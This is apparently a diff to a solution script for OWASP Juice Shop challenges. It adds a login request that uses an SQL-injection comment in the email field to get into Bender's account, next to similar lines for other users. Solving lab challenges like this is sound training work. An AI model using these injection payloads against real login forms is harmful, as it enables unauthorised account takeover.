@@ -22,3 +22,5 @@ requests.post(url+'/rest/user/login', data={'email':'mc.safesearch@juice-sh.op',
 requests.post(url+'/rest/user/login', data={'email':'chris.pike@juice-sh.op\'--','password':'a'})
 # ---- Login Amy (Log in with Amy's original user credentials. (This could take 93.83 billion trillion trillion centuries to brute force, but luckily she did not read the "One Important Final Note"))
 requests.post(url+'/rest/user/login', data={'email':'amy@juice-sh.op','password':'K1f.....................'})
+# ---- Login Bender (Log in with Bender's user account.)
+requests.post(url+'/rest/user/login', data={'email':'bender@juice-sh.op\'--','password':'a'})
